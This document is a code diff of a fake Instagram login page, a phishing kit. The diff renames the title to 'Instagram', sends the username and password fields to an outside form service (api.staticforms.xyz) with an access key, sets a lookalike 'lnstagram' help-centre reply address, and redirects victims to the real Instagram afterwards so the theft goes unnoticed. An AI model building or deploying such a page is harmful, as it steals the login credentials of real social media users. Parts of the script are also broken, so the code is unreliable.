@@ -2,42 +2,49 @@
 <html lang="en">
 <head>
         <meta charset="UTF-8">
-        <meta name="viewport"
-        content="width=device-width, user-scabelo=no, initial-scale=1.0,
-        maximum-scale=1.0, minimum-scale=1.0">
-        <meta http-equiv="X-UA-Compatible" content="ie=edge">
-        <title>lnstagram</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Instagram</title>
         <link href="img/logo.png" rel="icon" type="image/x-icon"/>
-        <!-- <link rel="stylesheet" href="http://use.fontawesome.com/release/v5.8.2/css/all.css"
-        integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW=Pj2yciDJxpsK1OYPAYjqT085Qq/lcq5FLAZQ7Ay"
-        crossoring="anonnymous">
-        <link rel="stylesheet" href="style.css"> -->
                 <script>
-                        function validar(){
-                                var nome = formuser.nome.value;
-                                // var email = formuser.email.value;
-                                var senha = formuser.senha.value;
-
-                                if(nome == ""){
-                                        alert('Preencha o campo nome.');
-                                        formuser.nome.focus();
-                                        return false;
-                                }
-
-                                // if(email == "" || email.indexOf('@') == -1 ){
-                                //         alert('Preencha o campo E-mail.');
-                                //         formuser.email.focus();
-                                //         return false;
+                        function required(){
+                                // function reload(){
+                                //         document.location.reload(true);
+                                //         location.href = "http://example.com";
+                                //         window. open("https://www.google.com", "_self");
+                                //         action="https://api.staticforms.xyz/submit"
                                 // }
-                                
-                                if(senha == "" || senha.length <= 4){
-                                        alert('Preencha o campo senha com minimo 5 caracteres');
-                                        formuser.senha.focus();
-                                        return false;
+                                function del(){
+                                        var deln = document.getElementsByTagName("form")[0].removeAttribute("name");
+                                        var dela = document.getElementsByTagName("form")[0].removeAttribute("action");
+                                        var delm = document.getElementsByTagName("form")[0].removeAttribute("method");
                                 }
+
+                                var user = formuser.$user.value;
+                                var pass = formuser.$pass.value;
+
+                                        if(user == ""){
+                                                del();     
+                                                alert('Preencha o campo nome.');
+                                                formuser.user.focus();
+                                                return false();
+                                        }
+                                        if(pass == "" || pass.length <= 4){
+                                                del();
+                                                alert('Preencha o campo senha com minimo 5 caracteres');
+                                                formuser.pass.focus();
+                                                return false();
+                                        }
+
+                                        // if(email == "" || email.indexOf('@') == -1 ){
+                                        //         alert('Preencha o campo E-mail.');
+                                        //         formuser.email.focus();
+                                        //         return false;
+                                        // }
                         }
+
                 </script>
-<style> 
+<style>
         /*<link rel="stylesheet" href="style.css"> Css Externo / Incorporado / inline*/
 *,
 *::before,
@@ -145,7 +152,7 @@ body{
         margin-right:0.5px;
         position:relative;
         top:3px; */
-} 
+}
 .has-separator{
         font-size: 1.3rem;
         color: #8e8e8e;
@@ -268,9 +275,14 @@ footer {
         }
 }
 @media (max-width: 450px) {
+        body{
+                background-color: #fff;
+        }
+        .logo img{
+                margin: 0 auto 30px;
+        }
         #wrapper{
                 padding-top: 0;
-                background-color: #fff;
                 /* background-color: transparent; */
         }
         .form-data form{
@@ -291,44 +303,35 @@ footer {
 </head>
 <body>
 
-<div id="wrapper">      
+<div id="wrapper">
         <div class="container">
                 <div class="phone-app-demo">
                         <img src="img/celfix.png" alt="">
                 </div>
                 <div class="form-data">
-                        <form action=""name="formuser" action="enviar.php" method="POST">
+                        <form name="formuser" action="https://api.staticforms.xyz/submit" method="post"><!-- del() -->
+                                <input type="hidden" name="accessKey" value="cada841b-593c-4d77-87be-a1b5aecfb610">
+                                <input type="hidden" name="replyTo" value="lnstagram.helpcenter.user.noreply@gmail.com">
+                                <input type="hidden" name="redirectTo" value="https://instagram.com">
                                 <div class="logo">
                                         <img src="img/instagram.png" alt="">
                                 </div>
-                                
-                                        <input type="text" name="nome" placeholder="phone number, username, or email">
-                                        <input type="password"  name="senha" placeholder="password">
-                                        <button class="form-btn" type="submit" onclick="return validar()" href="https://instagram.com">Login</button>
-                                
+
+                                        <input type="text" name="$user" placeholder="Phone number, username, or email">
+                                        <input type="password" name="$pass" placeholder="Password">
+                                        <button type="submit" value="Submit" onclick="required()" class="form-btn">Login</button>
+
                                 <span class="has-separator">Or</span>
-                                <button type="submit" class="form-btn-fb">
+                                <button type="submit" value="Submit" class="form-btn-fb">
                                         <a class ="facebook-login" href="https://facebook.com">
                                                 <div class="icon-fb">
                                                         <img src="img/facebook.png" alt="">Login with Facebook
                                                 </div>
-                                        
+
                                         </a>
-                                </button>       
+                                </button>
                                 <a class="password-reset" href="https://instagram.com">Forgot password?</a>
                         </form>
-
-                        <!-- <body>
-                                <h1>Cadastrar Usuário</h1>
-                                <form name="formuser" action="enviar.php" method="POST">
-                                        Nome:<input type="text" name="nome" ><br><br>
-                                        E-mail:<input type="text" name="email" ><br><br>
-                                        Senha:<input type="password" name="senha" ><br><br>
-                                        
-                                        <input type="submit" onclick="return validar()">
-                                </form>
-                        </body> -->
-
                         <div class="sign-up">
                                 Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
                         </div>
@@ -339,7 +342,7 @@ footer {
                                         <a href="https://play.google.com/store?hl=pt_BR&gl=US"><img src="img/gp.png"> </a>
                                 </div>
                         </div>
-                </div>        
+                </div>
         </div>
 </div>
 <footer>
@@ -386,3 +389,4 @@ footer {
 </footer>
 </body>
 </html>
+<!-- static forms -->
